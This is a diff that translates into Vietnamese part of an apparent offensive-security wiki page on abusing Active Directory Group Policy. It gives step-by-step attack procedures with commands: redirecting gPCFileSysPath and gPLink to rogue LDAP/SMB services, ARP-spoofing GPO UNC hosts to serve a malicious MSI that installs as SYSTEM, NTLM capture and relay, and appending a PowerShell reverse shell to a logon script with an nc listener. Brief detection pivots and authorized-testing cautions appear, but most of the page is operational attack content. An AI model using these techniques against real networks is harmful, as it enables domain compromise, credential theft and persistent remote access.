-For security settings such as local group membership and user rights, also inspect the applied GPO template at `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` and the `SecEdit` directory ACL. A writable directory or file is a review lead: effective SYSVOL share access, deny and inherited ACLs, the Group Policy container permissions, policy scope, and client refresh still determine whether a change can take effect. Membership in a group named “GPO Managers” alone does not establish edit rights. [Microsoft documents this template path and the Group Policy container/template split.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)
+Đối với các thiết lập bảo mật như tư cách thành viên nhóm cục bộ và quyền người dùng, hãy kiểm tra thêm template GPO đã áp dụng tại `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` và ACL của thư mục `SecEdit`. Thư mục hoặc tệp có quyền ghi là dấu hiệu cần xem xét: quyền truy cập hiệu lực vào share SYSVOL, các ACL từ chối và kế thừa, quyền của Group Policy container, phạm vi áp dụng chính sách và quá trình làm mới trên client vẫn quyết định liệu thay đổi có hiệu lực hay không. Chỉ là thành viên của một nhóm có tên “GPO Managers” không đồng nghĩa với việc có quyền chỉnh sửa. [Microsoft mô tả đường dẫn template này và sự phân tách giữa Group Policy container và template.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)
 
-Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
+Ngoài ra, cũng có thể cân nhắc các phương thức thực thi mã hoặc duy trì persistence khác, chẳng hạn như khai thác logon/logoff scripts, sửa đổi registry keys cho autoruns, cài đặt phần mềm qua các tệp .msi hoặc chỉnh sửa cấu hình service. Những kỹ thuật này cung cấp nhiều cách để duy trì quyền truy cập và kiểm soát các hệ thống mục tiêu thông qua việc lạm dụng GPO.
 
-### Redirecting GPC/GPT retrieval to authenticated rogue services
+### Chuyển hướng việc truy xuất GPC/GPT đến các dịch vụ giả mạo có xác thực
 
-A GPO consists of an LDAP **Group Policy Container (GPC)** with metadata and an SMB-hosted **Group Policy Template (GPT)** with the policy files. During refresh, the client follows the container's `gPLink`, reads the referenced GPC and its `gPCFileSysPath`, then downloads the GPT from that UNC path. Consequently, write access to either the GPC itself or the `gPLink` of an OU, Site or Domain can be converted into privileged policy processing.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+Một GPO gồm **Group Policy Container (GPC)** trên LDAP chứa metadata và **Group Policy Template (GPT)** được lưu trữ trên SMB, chứa các tệp chính sách. Trong quá trình làm mới, client theo `gPLink` của container, đọc GPC được tham chiếu và `gPCFileSysPath` của nó, rồi tải GPT từ đường dẫn UNC đó. Do đó, quyền ghi vào chính GPC hoặc `gPLink` của một OU, Site hoặc Domain đều có thể bị khai thác để can thiệp vào quá trình xử lý chính sách với đặc quyền cao.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 
-#### `gPCFileSysPath` poisoning with GPOddity
+#### Đầu độc `gPCFileSysPath` bằng GPOddity
 
-If the controlled principal can write the target GPC (directly or through **NTLM relay to LDAP**), replace `gPCFileSysPath` with a UNC path hosted by the attacker. [GPOddity](https://github.com/synacktiv/GPOddity) automates the LDAP change and serves a malicious GPT containing module-based policy files or an Immediate Task that the Group Policy client executes as `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>
+Nếu principal bị kiểm soát có thể ghi vào GPC mục tiêu (trực tiếp hoặc thông qua **NTLM relay to LDAP**), hãy thay `gPCFileSysPath` bằng đường dẫn UNC do attacker lưu trữ. [GPOddity](https://github.com/synacktiv/GPOddity) tự động hóa việc thay đổi LDAP và cung cấp một GPT độc hại chứa các tệp chính sách dựa trên module hoặc một Immediate Task mà Group Policy client thực thi với quyền `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>
 
-An anonymous or credential-agnostic SMB share is not sufficient on current Windows clients: SMB Secure Negotiate requires proof that authentication succeeded, so the rogue service must validate the domain identity, derive the SMB session key and correctly sign its responses. In embedded mode, configure GPOddity with a controlled machine account and its service key, then select a computer- or user-side payload in the `[COMMANDS]` section.<sup>[[15]](#references)[[16]](#references)</sup>
+Share SMB ẩn danh hoặc không phụ thuộc thông tin xác thực không đủ an toàn trên các client Windows hiện nay: SMB Secure Negotiate yêu cầu bằng chứng rằng xác thực đã thành công, vì vậy dịch vụ giả mạo phải xác thực danh tính domain, dẫn xuất session key của SMB và ký chính xác các phản hồi. Khi dùng chế độ nhúng, hãy cấu hình GPOddity bằng một machine account do bạn kiểm soát cùng service key của tài khoản đó, sau đó chọn payload phía computer hoặc user trong mục `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
 
 ```ini
 [SMB]
@@ -297,44 +297,44 @@ smb-iface=eth0
 python3 gpoddity.py --config config.ini -v
 ```
 
-**User GPO edge case:** after MS16-072, Windows still creates two SMB2 sessions in the **same TCP connection**: the user session reads `GPT.INI`, then the computer-account session reads effective configuration such as `ScheduledTasks.xml`. A rogue server must therefore index authentication state, session keys and signing keys by SMB2 `SessionId`, not only by socket. The Scapy fork embedded in GPOddity/OUned implements this through `SMBStreamSocketMultiplexing` and a multiplexing-aware `SMBServer`; single-session Impacket/Scapy servers otherwise reuse the wrong signing state and fail on user policies.<sup>[[15]](#references)</sup>
+**Trường hợp đặc biệt với User GPO:** sau MS16-072, Windows vẫn tạo hai phiên SMB2 trong **cùng một kết nối TCP**: phiên người dùng đọc `GPT.INI`, sau đó phiên tài khoản máy tính đọc cấu hình hiệu lực như `ScheduledTasks.xml`. Vì vậy, máy chủ giả mạo phải lập chỉ mục trạng thái xác thực, session key và signing key theo `SessionId` của SMB2, không chỉ theo socket. Bản fork Scapy được tích hợp trong GPOddity/OUned triển khai việc này thông qua `SMBStreamSocketMultiplexing` và `SMBServer` hỗ trợ multiplexing; nếu không, máy chủ Impacket/Scapy chỉ hỗ trợ một phiên sẽ dùng lại sai trạng thái ký và thất bại với các user policy.<sup>[[15]](#references)</sup>
 
-#### `gPLink` poisoning with OUned
+#### Đầu độc `gPLink` bằng OUned
 
-With `WriteGPLink`, `GenericWrite` or equivalent control over an OU, Site or Domain, an attacker can append a link whose GPC DN is served by an attacker-controlled LDAP host. This primitive was originally presented by Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automates the LDAP write and the malicious GPC/GPT chain.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
+Với quyền `WriteGPLink`, `GenericWrite` hoặc quyền kiểm soát tương đương đối với OU, Site hoặc Domain, kẻ tấn công có thể thêm một liên kết trỏ đến GPC DN được cung cấp bởi máy chủ LDAP do kẻ tấn công kiểm soát. Kỹ thuật này ban đầu được Petros Koutroumpis giới thiệu; [OUned](https://github.com/synacktiv/OUned) tự động hóa thao tác ghi LDAP và chuỗi GPC/GPT độc hại.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
 
 ```text
 [LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
 ```
 
-The victim first authenticates to the rogue LDAP service and receives a GPC whose `gPCFileSysPath` points to the rogue SMB service; it then authenticates to SMB and applies the supplied GPT. OUned therefore needs an account with an LDAP SPN, a machine account with a HOST SPN for SMB (the same machine account can satisfy both), and DNS resolution or reverse forwarding that sends ports 389 and 445 to the operator host.<sup>[[15]](#references)[[17]](#references)</sup>
+Nạn nhân trước tiên xác thực với dịch vụ LDAP giả mạo và nhận một GPC có `gPCFileSysPath` trỏ đến dịch vụ SMB giả mạo; sau đó, nạn nhân xác thực với SMB và áp dụng GPT được cung cấp. Do đó, OUned cần một tài khoản có SPN LDAP, một tài khoản máy có SPN HOST cho SMB (cùng một tài khoản máy có thể đáp ứng cả hai yêu cầu), cùng với DNS phân giải hoặc chuyển tiếp ngược để chuyển các cổng 389 và 445 đến máy của người vận hành.<sup>[[15]](#references)[[17]](#references)</sup>
 
 ```bash
 python3 OUned.py --config config.ini -v
 ```
 
-OUned's embedded Scapy LDAP server validates Kerberos/SPNEGO with the real controlled service key and serves arbitrary GPC data from JSON. The empty JSON key models rootDSE, `base64:` prefixes represent binary values, and the server supports add/delete/modify/search plus `BASE`, `LEVEL` and `SUBTREE` searches; it can negotiate no protection, integrity or confidentiality. This makes the service reusable when another Windows component follows an attacker-controlled LDAP reference but insists on authenticated LDAP.<sup>[[15]](#references)</sup>
+OUned tích hợp máy chủ LDAP Scapy xác thực Kerberos/SPNEGO bằng khóa dịch vụ thực tế do bạn kiểm soát và cung cấp dữ liệu GPC tùy ý từ JSON. Khóa JSON rỗng mô phỏng rootDSE, tiền tố `base64:` biểu thị các giá trị nhị phân, và máy chủ hỗ trợ các thao tác add/delete/modify/search cùng các kiểu tìm kiếm `BASE`, `LEVEL` và `SUBTREE`; máy chủ có thể thương lượng không dùng lớp bảo vệ, tính toàn vẹn hoặc tính bảo mật. Nhờ vậy, dịch vụ này có thể được tái sử dụng khi một thành phần Windows khác truy cập tham chiếu LDAP do kẻ tấn công kiểm soát nhưng yêu cầu LDAP đã xác thực.<sup>[[15]](#references)</sup>
 
-Do not assume that synchronizing an account password into a dummy domain reproduces every Kerberos key: RC4 derives from the password, whereas AES string-to-key also uses a salt derived from the principal's hostname/domain. Supplying the actual account AES key to `KerberosSSP` avoids forcing RC4 through a detectable change to the machine account's self-writable `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>
+Đừng cho rằng việc đồng bộ mật khẩu tài khoản vào một domain giả sẽ tái tạo mọi khóa Kerberos: RC4 được suy ra từ mật khẩu, trong khi AES string-to-key cũng dùng salt được suy ra từ hostname/domain của principal. Cung cấp khóa AES thực tế của tài khoản cho `KerberosSSP` giúp tránh phải ép dùng RC4 thông qua thay đổi dễ bị phát hiện đối với `msDS-SupportedEncryptionTypes` mà tài khoản máy có thể tự ghi.<sup>[[15]](#references)</sup>
 
-#### Detection pivots
+#### Các điểm cần điều tra để phát hiện
 
-Correlate changes to `gPCFileSysPath` or `gPLink` with GPO version changes and new Immediate/Scheduled Task XML. Investigate links to unexpected naming contexts, UNC hosts outside the approved DC/SYSVOL set, DNS records redirecting machine-account names, LDAP/CIFS service tickets for unusual machine accounts, and `msDS-SupportedEncryptionTypes` changes that enable RC4.<sup>[[15]](#references)</sup>
+Tương quan các thay đổi đối với `gPCFileSysPath` hoặc `gPLink` với thay đổi phiên bản GPO và XML Immediate/Scheduled Task mới. Điều tra các liên kết đến naming context bất thường, UNC host nằm ngoài danh sách DC/SYSVOL được phê duyệt, bản ghi DNS chuyển hướng tên tài khoản máy, service ticket LDAP/CIFS cho tài khoản máy bất thường và các thay đổi đối với `msDS-SupportedEncryptionTypes` bật RC4.<sup>[[15]](#references)</sup>
 
 ### WriteGPLink + UNC path hijacking (ARP spoofing)
 
-`WriteGPLink` over an OU/domain lets you modify the target container's `gPLink` attribute and **force an existing GPO to apply** without editing the GPO itself. This becomes interesting when the linked GPO already references remote content over **UNC paths** (`\\HOST\share\...`), because authenticated users can read **SYSVOL** and hunt for reusable policies offline.<sup>[[11]](#references)</sup>
+`WriteGPLink` trên OU/domain cho phép bạn sửa thuộc tính `gPLink` của container mục tiêu và **buộc một GPO hiện có được áp dụng** mà không cần chỉnh sửa chính GPO đó. Điều này đáng chú ý khi GPO được liên kết đã tham chiếu nội dung từ xa qua **UNC path** (`\\HOST\share\...`), vì người dùng đã xác thực có thể đọc **SYSVOL** và tìm các policy có thể tái sử dụng khi phân tích ngoại tuyến.<sup>[[11]](#references)</sup>
 
-High-level workflow:
+Quy trình tổng quát:
 
-1. Use BloodHound to identify a principal with `WriteGPLink` over an OU and enumerate computers/users inside that OU.
-2. Clone `SYSVOL` read-only and parse GPOs looking for **Software Installation**, **drive mappings** (`Drives.xml`), and **logon/startup scripts** that reference UNC paths.
-3. Prefer policies pointing to a **direct hostname** (for example `\\DC02\share\pkg.msi`) instead of DFS/domain-namespace paths, because hostname-based paths are easier to redirect with L2 spoofing.
-4. Append the chosen GPO GUID to the target OU's `gPLink` so the victim processes that already-existing policy.
-5. On the same broadcast domain, ARP spoof the UNC host and bind its IP locally (`ip addr add <target_ip>/32 dev <iface>`) so the victim's SMB traffic reaches your host.
-6. Serve the expected path/filename from an attacker SMB server (for example `smbserver.py`) and wait for normal policy processing.
+1. Dùng BloodHound để xác định principal có `WriteGPLink` trên một OU và liệt kê máy tính/người dùng bên trong OU đó.
+2. Sao chép `SYSVOL` ở chế độ chỉ đọc và phân tích GPO để tìm **Software Installation**, **ánh xạ ổ đĩa** (`Drives.xml`) và **script đăng nhập/khởi động** tham chiếu đến UNC path.
+3. Ưu tiên các policy trỏ đến **hostname trực tiếp** (ví dụ `\\DC02\share\pkg.msi`) thay vì DFS/domain-namespace path, vì các path dùng hostname dễ bị chuyển hướng hơn bằng giả mạo L2.
+4. Thêm GUID của GPO đã chọn vào `gPLink` của OU mục tiêu để máy nạn nhân xử lý policy hiện có đó.
+5. Trên cùng broadcast domain, giả mạo ARP của UNC host và gán IP của nó cục bộ (`ip addr add <target_ip>/32 dev <iface>`) để lưu lượng SMB của máy nạn nhân đi đến host của bạn.
+6. Cung cấp path/filename được mong đợi từ máy chủ SMB do kẻ tấn công kiểm soát (ví dụ `smbserver.py`) và chờ quá trình xử lý policy thông thường.
 
-Example `SYSVOL` collection and GPO correlation:
+Ví dụ thu thập `SYSVOL` và đối chiếu GPO:
 
 ```bash
 mkdir -p /mnt/$DOMAIN/SYSVOL/
@@ -345,7 +345,7 @@ python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
 python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
 ```
 
-Link the existing GPO to the target OU:
+Liên kết GPO hiện có với OU đích:
 
 ```bash
 python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
@@ -354,14 +354,14 @@ python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
 
 #### Software Installation UNC hijack -> SYSTEM
 
-If the linked GPO deploys an MSI from a UNC path, the client will fetch it during **computer startup** and install it as **`NT AUTHORITY\SYSTEM`**. By spoofing the referenced host and serving a malicious MSI under the **same share/path/name**, you can turn `WriteGPLink` into SYSTEM code execution **without modifying SYSVOL**.
+Nếu GPO được liên kết triển khai MSI từ đường dẫn UNC, client sẽ tải MSI trong lúc **khởi động máy tính** và cài đặt với quyền **`NT AUTHORITY\SYSTEM`**. Bằng cách giả mạo host được tham chiếu và cung cấp MSI độc hại tại **cùng share/path/name**, bạn có thể biến `WriteGPLink` thành thực thi mã với quyền SYSTEM **mà không cần chỉnh sửa SYSVOL**.
 
-Important constraints:
+Các ràng buộc quan trọng:
 
-- **Timing matters**: the new link is seen at policy refresh (commonly ~90 minutes), but **Software Installation** usually triggers on **reboot**.
-- Windows Installer commonly tracks the deployment using the package **`ProductCode`**. If the product is already installed, deployment may be skipped.
-- To avoid installer rejection, patch the rogue MSI so its **`ProductCode`** and **`PackageCode`** match the legitimate package expected by the GPO.
-- Old `.aas` advertisement files may remain in `SYSVOL`, so validate that the deployment still looks active before relying on it.
+- **Thời điểm rất quan trọng**: liên kết mới sẽ được áp dụng khi làm mới policy (thường khoảng 90 phút), nhưng **Software Installation** thường chỉ được kích hoạt khi **khởi động lại**.
+- Windows Installer thường theo dõi bản triển khai bằng **`ProductCode`** của package. Nếu sản phẩm đã được cài đặt, quá trình triển khai có thể bị bỏ qua.
+- Để tránh installer từ chối, hãy chỉnh sửa MSI giả mạo để **`ProductCode`** và **`PackageCode`** khớp với package hợp lệ mà GPO yêu cầu.
+- Các file quảng bá `.aas` cũ có thể vẫn còn trong `SYSVOL`, vì vậy hãy xác minh rằng bản triển khai vẫn có vẻ đang hoạt động trước khi dựa vào nó.
 
 ```bash
 ip addr add <unc_host_ip>/32 dev <iface>
@@ -369,38 +369,38 @@ arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
 smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
 ```
 
-#### Drive-map UNC hijack -> NTLM capture / WebDAV relay
+#### Drive-map UNC hijack -> Thu thập NTLM / WebDAV relay
 
-GPP drive mappings in `Drives.xml` cause users to authenticate to the configured UNC path during logon or reconnection. If you spoof the referenced host, you can capture **NetNTLMv2**. If SMB is deliberately made to fail, Windows may retry over **WebDAV**, sending **NTLM over HTTP**, which is far more flexible for relays to **LDAP(S)**, **AD CS**, or **SMB**.
+GPP drive mappings trong `Drives.xml` khiến người dùng xác thực tới đường dẫn UNC đã cấu hình khi đăng nhập hoặc kết nối lại. Nếu spoof host được tham chiếu, bạn có thể thu thập **NetNTLMv2**. Nếu cố ý làm SMB thất bại, Windows có thể thử lại qua **WebDAV**, gửi **NTLM qua HTTP**; cách này linh hoạt hơn nhiều khi relay tới **LDAP(S)**, **AD CS** hoặc **SMB**.
 
 #### Logon/startup script UNC hijack
 
-The same pattern applies to UNC-hosted scripts discovered in `SYSVOL`:
+Cách thức tương tự áp dụng cho các script được lưu trữ trên UNC và tìm thấy trong `SYSVOL`:
 
-- **Logon scripts** usually execute in the **user** context.
-- **Startup scripts** usually execute in the **computer / SYSTEM** context.
+- **Logon scripts** thường chạy trong ngữ cảnh **user**.
+- **Startup scripts** thường chạy trong ngữ cảnh **computer / SYSTEM**.
 
-If the script path points to a spoofable hostname, redirect the UNC host and serve replacement script content from the expected location.
+Nếu đường dẫn script trỏ tới một hostname có thể spoof, hãy chuyển hướng host UNC và cung cấp nội dung script thay thế từ vị trí dự kiến.
 
 ## SYSVOL/NETLOGON Logon Script Poisoning
 
-Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.
+Các đường dẫn có quyền ghi trong `\\<dc>\SYSVOL\<domain>\scripts\` hoặc `\\<dc>\NETLOGON\` cho phép sửa đổi logon scripts được thực thi khi người dùng đăng nhập thông qua GPO. Việc này cho phép thực thi mã trong ngữ cảnh bảo mật của những người dùng đăng nhập.
 
-### Locate logon scripts
-- Inspect user attributes for a configured logon script:
+### Tìm logon scripts
+- Kiểm tra các thuộc tính của người dùng để tìm logon script đã cấu hình:
 
 ```powershell
 Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
 ```
 
-- Crawl domain shares to surface shortcuts or references to scripts:
+- Crawl các share trong domain để tìm shortcut hoặc tham chiếu đến script:
 
 ```bash
 # NetExec spider (authenticated)
 netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
 ```
 
-- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (useful DFIR trick and for attackers without direct GPO access):
+- Phân tích các file `.lnk` để xác định đích trỏ đến SYSVOL/NETLOGON (mẹo DFIR hữu ích cho attacker không có quyền truy cập GPO trực tiếp):
 
 ```bash
 # LnkParse3
@@ -409,10 +409,10 @@ lnkparse login.vbs.lnk
 # C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
 ```
 
-- BloodHound displays the user object's `scriptPath` logon-script attribute when present. GPO-configured logon scripts are a separate policy reference, so inspect the applicable GPO as well.
+- BloodHound hiển thị thuộc tính script logon `scriptPath` của đối tượng người dùng nếu có. Các script logon được cấu hình bằng GPO là một tham chiếu chính sách riêng, vì vậy cũng hãy kiểm tra GPO áp dụng.
 
-### Validate write access (don’t trust share listings)
-Automated tooling may show SYSVOL/NETLOGON as read-only even when the exact script has a different NTFS ACL. Start with read-only inspection of that file and its parent directory; matching Allow ACEs remain candidates because effective SMB and NTFS access, Deny ACEs, and the current token all matter:
+### Xác thực quyền ghi (đừng tin danh sách share)
+Công cụ tự động có thể hiển thị SYSVOL/NETLOGON là chỉ đọc ngay cả khi ACL NTFS của script cụ thể đó khác. Hãy bắt đầu bằng việc kiểm tra chỉ đọc tệp và thư mục cha của nó; các ACE Allow khớp vẫn là những ứng viên cần xem xét vì quyền truy cập SMB và NTFS hiệu lực, ACE Deny và token hiện tại đều có ảnh hưởng:
 
 ```powershell
 Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
@@ -421,10 +421,10 @@ Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
   Format-List Owner,AccessToString
 ```
 
-An authorized write test should be target-specific and reversible, with the original script backed up and restored. Do not overwrite a working logon script merely to test access; a successful write can run at the next user's logon.
+Một bài kiểm tra quyền ghi được ủy quyền phải nhắm đúng mục tiêu và có thể hoàn tác, đồng thời cần sao lưu rồi khôi phục script gốc. Đừng ghi đè lên một logon script đang hoạt động chỉ để kiểm tra quyền truy cập; thao tác ghi thành công có thể khiến script chạy khi người dùng tiếp theo đăng nhập.
 
-### Poison a VBScript logon script for RCE
-Append a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original logic to avoid breaking business function:
+### Đầu độc VBScript logon script để thực thi mã từ xa (RCE)
+Thêm một lệnh để khởi chạy reverse shell PowerShell (tạo trên revshells.com) và giữ nguyên logic ban đầu để tránh làm hỏng chức năng nghiệp vụ:
 
 ```vb
 ' At top of login.vbs
@@ -436,34 +436,34 @@ MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
 MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
 ```
 
-Listen on your host and wait for the next interactive logon:
+Lắng nghe trên host của bạn và chờ lần đăng nhập tương tác tiếp theo:
 
 ```bash
 rlwrap -cAr nc -lnvp 443
 ```
 
-Notes:
-- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
-- Clean up by restoring the original content/timestamps after use.
+Ghi chú:
+- Việc thực thi diễn ra dưới token của người dùng ghi nhật ký (không phải SYSTEM). Phạm vi là liên kết GPO (OU, site, domain) áp dụng script đó.
+- Sau khi sử dụng, hãy khôi phục nội dung/dấu thời gian ban đầu để dọn dẹp.
 
 
 ## References
 
-- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
-- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
-- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
-- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
-- [5] [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
-- [6] [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
-- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
-- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
-- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
-- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
-- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
-- [12] [GPOddity: exploiting Active Directory GPOs through NTLM relaying, and more](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
-- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
-- [14] [OUned.py: exploiting hidden Organizational Units ACL attack vectors in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
-- [15] [Simulating legitimate Active Directory services on the network: the case of GPO exploitation](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
-- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
-- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
-- [18] [HTB: Hercules — OU movement and inherited ACL abuse](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
+- [1] [Lạm dụng ACL/ACE của Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+- [2] [Tài khoản có đặc quyền và đặc quyền token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
+- [3] [BloodHound 1.3 – Cập nhật đường tấn công ACL](https://wald0.com/?p=112)
+- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
+- [5] [Leo thang đặc quyền bằng ACL trong Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+- [6] [Quét đặc quyền và tài khoản có đặc quyền trong Active Directory](https://adsecurity.org/?p=3658)
+- [7] [Hàm khởi tạo ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [8] [BloodyAD – Thao tác thuộc tính AD/UAC từ Linux](https://github.com/CravateRouge/bloodyAD)
+- [9] [Samba – net rpc (tư cách thành viên nhóm)](https://www.samba.org/)
+- [10] [HTB Puppy: Lạm dụng AD ACL, bẻ khóa KeePassXC Argon2 và giải mã DPAPI để giành quyền quản trị DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [11] [TrustedSec - Vòng quanh ARP rồi tìm ra: Chiếm quyền đường dẫn UNC của GPO để thực thi mã và NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
+- [12] [GPOddity: khai thác GPO của Active Directory thông qua NTLM relay và hơn thế nữa](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
+- [13] [OU đang đùa đấy à? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
+- [14] [OUned.py: khai thác các vector tấn công ACL của Organizational Unit ẩn trong Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
+- [15] [Mô phỏng các dịch vụ Active Directory hợp pháp trên mạng: trường hợp khai thác GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
+- [16] [GPOddity của Synacktiv](https://github.com/synacktiv/GPOddity)
+- [17] [OUned của Synacktiv](https://github.com/synacktiv/OUned)
+- [18] [HTB: Hercules — Di chuyển giữa các OU và lạm dụng ACL kế thừa](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
